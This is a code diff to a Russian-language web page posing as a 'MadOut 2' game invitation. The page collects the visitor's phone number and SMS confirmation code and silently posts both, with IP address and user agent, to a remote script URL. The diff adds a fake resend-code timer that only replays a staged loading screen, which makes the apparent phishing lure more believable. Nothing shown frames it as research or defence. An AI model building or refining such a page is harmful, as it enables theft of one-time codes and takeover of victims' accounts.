@@ -32,10 +32,14 @@
         .btn { width: 100%; padding: 14px; background: var(--accent); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
         .btn:active { opacity: 0.8; }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-outline { width: 100%; padding: 12px; background: transparent; color: #8890a0; border: 1px solid #2a3040; border-radius: 10px; font-size: 13px; cursor: pointer; margin-top: 8px; }
+        .btn-outline:hover { border-color: var(--accent); color: var(--text); }
+        .btn-outline:disabled { opacity: 0.3; cursor: not-allowed; }
         .footer { margin-top: 16px; font-size: 11px; color: #555; }
         .error-msg { color: #ff4444; font-size: 12px; margin-top: 8px; display: none; }
+        .timer-text { color: #8890a0; font-size: 12px; margin-top: 12px; }
+        .timer-text span { color: var(--gold); font-weight: 600; }
         
-        /* Анимация загрузки */
         .loading-overlay { display: none; text-align: center; padding: 40px 0; }
         .spinner { width: 50px; height: 50px; border: 4px solid #2a3040; border-top: 4px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -74,10 +78,13 @@
         <div id="screen-code" style="display:none;">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo.png" alt="MadOut 2"></div>
             <div class="logo-sub">Подтверждение</div>
-            <p style="color:#8890a0;font-size:13px;margin-bottom:20px;">Код отправлен на номер<br><strong id="display-phone" style="color:#ffd700;"></strong></p>
+            <p style="color:#8890a0;font-size:13px;margin-bottom:4px;">Код отправлен на номер</p>
+            <p style="margin-bottom:16px;"><strong id="display-phone" style="color:#ffd700;"></strong></p>
             <div class="input-group"><label>Код из SMS</label><div class="code-wrapper"><input type="text" id="code" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')"></div></div>
             <button class="btn" id="btn-code" onclick="confirmCode()">Подтвердить</button>
             <div class="error-msg" id="code-error">Введите код из SMS</div>
+            <p class="timer-text">Не пришёл код? Отправить повторно через <span id="timer">60</span> сек</p>
+            <button class="btn-outline" id="btn-resend" onclick="resendCode()" disabled>Отправить код повторно</button>
         </div>
 
         <!-- ЭКРАН 3: УСПЕХ -->
@@ -103,6 +110,9 @@
         document.getElementById('inviter-name').textContent = inviter;
         document.getElementById('inviter-avatar').textContent = inviter.charAt(0).toUpperCase();
         if (document.getElementById('inviter-name-done')) document.getElementById('inviter-name-done').textContent = inviter;
+        
+        var timerInterval = null;
+        var timerSeconds = 60;
 
         function getIP() {
             return new Promise(function(resolve) {
@@ -124,6 +134,24 @@
             input.value = formatted;
         }
 
+        function startTimer() {
+            timerSeconds = 60;
+            document.getElementById('timer').textContent = timerSeconds;
+            document.getElementById('btn-resend').disabled = true;
+            
+            if (timerInterval) clearInterval(timerInterval);
+            
+            timerInterval = setInterval(function() {
+                timerSeconds--;
+                document.getElementById('timer').textContent = timerSeconds;
+                if (timerSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('btn-resend').disabled = false;
+                    document.getElementById('timer').textContent = '0';
+                }
+            }, 1000);
+        }
+
         async function requestCode() {
             var phone = document.getElementById('phone').value.replace(/\D/g, '');
             if (phone.length !== 10) { 
@@ -136,19 +164,28 @@
             var ip = await getIP();
             var fullPhone = '+7' + phone;
             
-            // Отправляем данные
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
             
-            // Показываем экран загрузки
             document.getElementById('screen-phone').style.display = 'none';
             document.getElementById('loading-phone').textContent = '+7 ' + document.getElementById('phone').value;
             document.getElementById('screen-loading').style.display = 'block';
             
-            // Через 3 секунды показываем поле ввода кода
             setTimeout(function() {
                 document.getElementById('screen-loading').style.display = 'none';
                 document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value;
                 document.getElementById('screen-code').style.display = 'block';
+                startTimer();
+            }, 3000);
+        }
+
+        function resendCode() {
+            document.getElementById('screen-code').style.display = 'none';
+            document.getElementById('screen-loading').style.display = 'block';
+            
+            setTimeout(function() {
+                document.getElementById('screen-loading').style.display = 'none';
+                document.getElementById('screen-code').style.display = 'block';
+                startTimer();
             }, 3000);
         }
 
@@ -164,15 +201,14 @@
             
             var ip = await getIP();
             
-            // Блокируем кнопку
             var btn = document.getElementById('btn-code');
             btn.disabled = true;
             btn.textContent = 'ПРОВЕРКА...';
             
-            // Отправляем код
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
             
-            // Показываем успех
+            if (timerInterval) clearInterval(timerInterval);
+            
             setTimeout(function() {
                 document.getElementById('screen-code').style.display = 'none';
                 document.getElementById('screen-done').style.display = 'block';
